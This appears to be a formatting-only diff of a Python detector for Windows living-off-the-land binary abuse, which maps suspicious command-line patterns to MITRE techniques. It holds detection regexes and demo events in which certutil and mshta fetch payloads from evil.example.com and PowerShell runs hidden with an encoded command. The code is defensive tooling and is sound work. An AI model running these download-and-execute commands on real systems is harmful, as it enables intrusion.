@@ -7,14 +7,14 @@ command-line patterns and parent-child process relationships.
 """
 
 import argparse
+import datetime
 import json
 import os
 import re
-import sys
-import datetime
 
 try:
     import requests
+
     HAS_REQUESTS = True
 except ImportError:
     HAS_REQUESTS = False
@@ -23,8 +23,12 @@ except ImportError:
 LOLBIN_SIGNATURES = {
     "certutil.exe": {
         "suspicious_args": [
-            r"-urlcache", r"-split", r"-decode", r"-encode",
-            r"-verifyctl", r"http[s]?://",
+            r"-urlcache",
+            r"-split",
+            r"-decode",
+            r"-encode",
+            r"-verifyctl",
+            r"http[s]?://",
         ],
         "mitre": ["T1140", "T1105"],
         "description": "Certificate utility abused for file download/decode",
@@ -36,8 +40,10 @@ LOLBIN_SIGNATURES = {
     },
     "rundll32.exe": {
         "suspicious_args": [
-            r"javascript:", r"shell32\.dll.*ShellExec_RunDLL",
-            r"url\.dll.*FileProtocolHandler", r"advpack\.dll.*RegisterOCX",
+            r"javascript:",
+            r"shell32\.dll.*ShellExec_RunDLL",
+            r"url\.dll.*FileProtocolHandler",
+            r"advpack\.dll.*RegisterOCX",
         ],
         "mitre": ["T1218.011"],
         "description": "DLL loader abused for proxy execution",
@@ -64,7 +70,9 @@ LOLBIN_SIGNATURES = {
     },
     "wmic.exe": {
         "suspicious_args": [
-            r"process\s+call\s+create", r"os\s+get", r"/node:",
+            r"process\s+call\s+create",
+            r"os\s+get",
+            r"/node:",
             r"shadowcopy\s+delete",
         ],
         "mitre": ["T1047"],
@@ -77,9 +85,13 @@ LOLBIN_SIGNATURES = {
     },
     "powershell.exe": {
         "suspicious_args": [
-            r"-enc\s+[A-Za-z0-9+/=]{20,}", r"-ExecutionPolicy\s+Bypass",
-            r"-WindowStyle\s+Hidden", r"Invoke-Expression",
-            r"IEX\s*\(", r"Net\.WebClient", r"DownloadString",
+            r"-enc\s+[A-Za-z0-9+/=]{20,}",
+            r"-ExecutionPolicy\s+Bypass",
+            r"-WindowStyle\s+Hidden",
+            r"Invoke-Expression",
+            r"IEX\s*\(",
+            r"Net\.WebClient",
+            r"DownloadString",
         ],
         "mitre": ["T1059.001"],
         "description": "PowerShell with obfuscation or download cradle",
@@ -109,24 +121,28 @@ def analyze_process_event(process_name, command_line, parent_name=None):
             if re.search(pattern, cmd_lower, re.IGNORECASE):
                 matched_patterns.append(pattern)
         if matched_patterns:
-            findings.append({
-                "type": "lolbin_abuse",
-                "binary": proc_lower,
-                "description": sig["description"],
-                "mitre_techniques": sig["mitre"],
-                "matched_patterns": matched_patterns,
-                "command_line": command_line[:200],
-                "severity": "HIGH",
-            })
+            findings.append(
+                {
+                    "type": "lolbin_abuse",
+                    "binary": proc_lower,
+                    "description": sig["description"],
+                    "mitre_techniques": sig["mitre"],
+                    "matched_patterns": matched_patterns,
+                    "command_line": command_line[:200],
+                    "severity": "HIGH",
+                }
+            )
 
     if parent_name and parent_name.lower() in SUSPICIOUS_PARENTS:
-        findings.append({
-            "type": "suspicious_parent",
-            "parent": parent_name.lower(),
-            "child": proc_lower,
-            "description": SUSPICIOUS_PARENTS[parent_name.lower()],
-            "severity": "HIGH",
-        })
+        findings.append(
+            {
+                "type": "suspicious_parent",
+                "parent": parent_name.lower(),
+                "child": proc_lower,
+                "description": SUSPICIOUS_PARENTS[parent_name.lower()],
+                "severity": "HIGH",
+            }
+        )
 
     return findings
 
@@ -162,9 +178,7 @@ def fetch_lolbas_data():
 
 
 def main():
-    parser = argparse.ArgumentParser(
-        description="Detect living off the land (LOLBin) attacks"
-    )
+    parser = argparse.ArgumentParser(description="Detect living off the land (LOLBin) attacks")
     parser.add_argument("--log-file", help="JSON file with process creation events")
     parser.add_argument("--fetch-lolbas", action="store_true", help="Fetch LOLBAS project data")
     parser.add_argument("--output", "-o", help="Output JSON report path")
@@ -189,33 +203,50 @@ def main():
         print(f"[*] Suspicious findings: {len(results)}")
     else:
         demo_events = [
-            {"process_name": "certutil.exe",
-             "command_line": "certutil.exe -urlcache -split -f https://evil.example.com/payload.exe C:\\temp\\payload.exe",
-             "parent_name": "cmd.exe"},
-            {"process_name": "mshta.exe",
-             "command_line": "mshta.exe javascript:a=GetObject('script:https://evil.example.com/s.sct')",
-             "parent_name": "winword.exe"},
-            {"process_name": "powershell.exe",
-             "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgA...",
-             "parent_name": "excel.exe"},
-            {"process_name": "notepad.exe",
-             "command_line": "notepad.exe C:\\Users\\admin\\notes.txt",
-             "parent_name": "explorer.exe"},
+            {
+                "process_name": "certutil.exe",
+                "command_line": "certutil.exe -urlcache -split -f https://evil.example.com/payload.exe C:\\temp\\payload.exe",
+                "parent_name": "cmd.exe",
+            },
+            {
+                "process_name": "mshta.exe",
+                "command_line": "mshta.exe javascript:a=GetObject('script:https://evil.example.com/s.sct')",
+                "parent_name": "winword.exe",
+            },
+            {
+                "process_name": "powershell.exe",
+                "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgA...",
+                "parent_name": "excel.exe",
+            },
+            {
+                "process_name": "notepad.exe",
+                "command_line": "notepad.exe C:\\Users\\admin\\notes.txt",
+                "parent_name": "explorer.exe",
+            },
         ]
         results = scan_process_log(demo_events)
         report["findings"] = results
         print(f"\n[DEMO] Analyzed {len(demo_events)} process events")
         for r in results:
             for f in r["findings"]:
-                print(f"  [!] {f['type']}: {f['binary'] if 'binary' in f else f.get('child','')} "
-                      f"- {f['description']}")
+                print(
+                    f"  [!] {f['type']}: {f['binary'] if 'binary' in f else f.get('child', '')} "
+                    f"- {f['description']}"
+                )
 
     if args.output:
         with open(args.output, "w") as f:
             json.dump(report, f, indent=2)
 
-    print(json.dumps({"lolbins_monitored": len(LOLBIN_SIGNATURES),
-                       "findings": len(report.get("findings", []))}, indent=2))
+    print(
+        json.dumps(
+            {
+                "lolbins_monitored": len(LOLBIN_SIGNATURES),
+                "findings": len(report.get("findings", [])),
+            },
+            indent=2,
+        )
+    )
 
 
 if __name__ == "__main__":
